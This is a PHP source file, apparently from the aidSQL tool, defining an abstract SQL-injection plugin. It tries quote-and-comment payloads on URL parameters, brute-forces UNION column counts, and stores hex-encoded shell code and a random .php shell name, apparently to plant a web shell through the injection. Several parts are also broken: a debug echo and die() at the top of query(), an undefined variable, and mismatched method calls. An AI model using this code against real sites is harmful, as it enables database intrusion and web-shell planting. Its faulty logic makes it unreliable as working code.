<?php

	namespace aidSQL\plugin\sqli {

		abstract class InjectionPlugin implements InjectionPluginInterface {

			//General Stuff

			protected	$_logger						=	NULL;
			protected 	$_httpAdapter				=	NULL;
			protected	$_verbose					=	FALSE;

			//This is a plugin that knows howto check if the injection has succeded
			//The whole point is to the children classes to set the parser of their
			//preference.

			protected 	$_parser						=	NULL;
			protected	$_config						=	NULL;

			//Injection related stuff

			protected 	$_injectionAttempts		=	40;
			protected	$_fieldPayloads			=	array('',"'", "%'","')","%')");
			protected	$_queryBuilder				=	NULL;

			//Shell related stuff
			protected	$_shellCode					=	NULL;
			protected	$_shellFileName			=	NULL;

			//Post SQL Injection information
			protected	$_affectedUrlVariable	=	array();

			//A database schema object
			protected	$_dbSchema					=	NULL;		

			public final function __construct(\aidSQL\http\Adapter $adapter,Array $config,\aidSQL\core\Logger &$log=NULL){

				$url	=	$adapter->getUrl();

				$this->_queryBuilder	=	new \aidSQL\core\QueryBuilder();

				if(!$url->getQueryAsArray()){
					throw(new \Exception("Unable to perform injection without any request variables set in the http adapter!"));
				}

				$this->_httpAdapter = $adapter;

				if(!is_null($log)){
					$this->setLog($log);
				}

				$this->setConfig($config);

			}

			public function setShellCode($shellCode=NULL){

				if(!empty($shellCode)){

					$this->_shellCode	=	\String::hexEncode($shellCode);
					$this->log("Set shell code to $shellCode",0,"light_cyan");
					return TRUE;
				}

				$this->log("Warning! Provided empty shell code",2,"yellow");

				return FALSE;

			}

			public function setShellName($fileName=NULL){

				if(empty($fileName)){
					$fileName	=	md5(rand(0,time())).".php";	
					$this->log("Warning, assumed random shell name $fileName, use --shell-name to set a shell name of your own!",2,"yellow");
				}

				$this->log("Set Shell name : $fileName",0,"light_cyan");

				$this->_shellFileName	=	$fileName;

			}

			public function getShellName(){

				return $this->_shellFileName;

			}

			public function setInjectionAttempts($int=0){

				if(!$int){

					throw(new \Exception("Injection attempts has to be greater than 0"));

				}

				$this->_injectionAttempts	=	$int;

			}

			public function getInjectionAttempts(){

				return $this->_injectionAttempts;

			}

			public function setConfig(Array $config){
				$this->_config=$config;
			}

			public function setLog(\aidSQL\core\Logger &$log){
				$this->_logger = $log;
			}

			public function log($msg = NULL,$color="white",$type="0",$toFile=FALSE){

				if(!(isset($this->_config["all"]["verbose"])&&(bool)$this->_config["all"]["verbose"])){
					echo ".";
					return;
				}

				$logToFile			=	(isset($this->_config["log-all"]))	?	TRUE	:	$toFile;

				if(!is_null($this->_logger)){

					$this->_logger->setPrepend("[".get_class($this)."]");
					$this->_logger->log($msg,$color,$type,$logToFile);
					return TRUE;

				}

				return FALSE;

			}

			/**
			*Checkout if the given URL by the HttpAdapter is vulnerable or not
			*This method combines execution
			*/

			public function isVulnerable(){

				$url			=	$this->_httpAdapter->getUrl();
				$vars			=	$url->getQueryAsArray();
				$vars			=	$this->orderRequestVariables($vars);
				$found		=	FALSE;

				$keys	=	array_keys($this->_config);

				if(in_array("numeric-only",$keys)){

					$vars	=	$vars["numeric"];

				}elseif(in_array("strings-only",$keys)){

					$vars	=	$vars["strings"];

				}else{	//Default, use both

					$vars	=	array_merge($vars["numeric"],$vars["strings"]);

				}

				//Start offset, use it when you know the amount of fields involved in the union injection

				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;

				if(!$offset){
					throw(new \Exception("Start offset should be an integer greater than 0!"));
				}


				foreach($vars as $variable=>$value){

					$iterationContainer	=	array();

					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){

						$iterationContainer[]	=	$maxFields;

						$this->log("[$variable] Attempt:\t$maxFields",0,"light_cyan");

						foreach($this->_fieldPayloads as $payLoad){

							foreach($this->_commentPayloads as $terminating){

								$injection		=	$this->generateInjection($value.$payLoad,$iterationContainer,$terminating["open"]);
								$result			=	$this->query($variable,$injection);

								if($this->_parser->analyze($result)){

									$this->_affectedUrlVariable($variable);
									return TRUE;

								}

							}

						}

					}

					$url	=	$this->_httpAdapter->getUrl();

					//Restore value if we couldnt find the vulnerable field
					$url->addRequestVariable($variable,$value); 
					$this->_httpAdapter->setUrl($url);

				}

				return FALSE;

			}


			private function generateInjection($fieldValue,Array $values,$terminating=NULL){

				foreach($values as &$value){
					$value	=	$this->wrap($value);
				}

				$injection	=	$fieldValue																	.
									$this->_space																.
									preg_replace("/\s/",$this->_space,$this->_injectionString)	.
									$this->_space																.
									implode($values,$this->_fieldDelimiter);

				if(!empty($this->_order["field"])){

					$injection.=$this->_space;
					$injection.="ORDER".$this->_space."BY".$this->_space.$this->_order["field"];

					if(!empty($this->_order["sort"])){
						$injection.=$this->_space.$this->_order["sort"];
					}

					$order	=	TRUE;

				}

				if(sizeof($this->_limit)){

					if($order){
						$injection.=$this->_space;
					}

					$injection	.=	implode($this->_limit,',');

				}

				if(!empty($terminating)){
					$injection	.=	$this->_space.$terminating;
				}

				return $injection;

			}


			protected function query(\aidSQL\core\QueryBuilder $builder,$variable=NULL){

				echo $builder->getSQL();
				die();
				if(empty($variable)){

					if(empty($this->_affectedUrlVariable)){

						throw (new \Exception("Cannot make query with no affected url variable set!"));

					}else{

						$variable	=	$this->_affectedUrlVariable;

					}

				}

				$this->log("QUERY: $sql");

				$url	=	$this->_httpAdapter->getUrl();
				$url->addRequestVariable($variable,$sql);
				$this->_httpAdapter->setUrl($url);

				try{

					$content = $this->_httpAdapter->fetch();

					if($content===FALSE){

							$this->log("No content you have to modify the http adapter in order to retry on server error ...");

					}

				}catch(\Exception $e){

					$this->log($e->getMessage());

				}

				if($this->_verbose){
					$this->log($content);
				}

				return $content;

			}

			public function setHttpAdapter(aidSQL\http\Adapter $adapter){
				$this->_httpAdapter = $adapter;
			}

			public function getHttpAdapter(){
				return $this->_httpAdapter;
			}

			public function setTable($table=NULL){

				if(empty($table)){
					throw (new Exception("The table name cant be empty!"));
				}

				$this->_table = $table;

			}

			public function getSchema(){

				return $this->_dbSchema;

			}

			/**
			*This for now, only stands for outputting the results from URL execution to stdout
			*/

			public function setVerbose($boolean=TRUE){
				$this->_verbose = $boolean;
			}

			public function getVerbose(){
				return $this->_verbose;
			}

			public function setParser(\aidSQL\parser\ParserInterface &$parser){
				$this->_parser = $parser;
			}

			public function getParser(){
				return $this->_parser;
			}

			private function orderRequestVariables(Array $requestVariables){

				$numVariables	=	array();
				$strVariables	=	array();

				foreach($requestVariables as $name=>$value){

					if(is_numeric($value)){
						$numVariables[$name]	=	$value;
					}else{
						$strVariables[$name]	=	$value;
					}

				}

				return array("strings"=>$strVariables,"numeric"=>$numVariables);

			}

		}

	}

?>
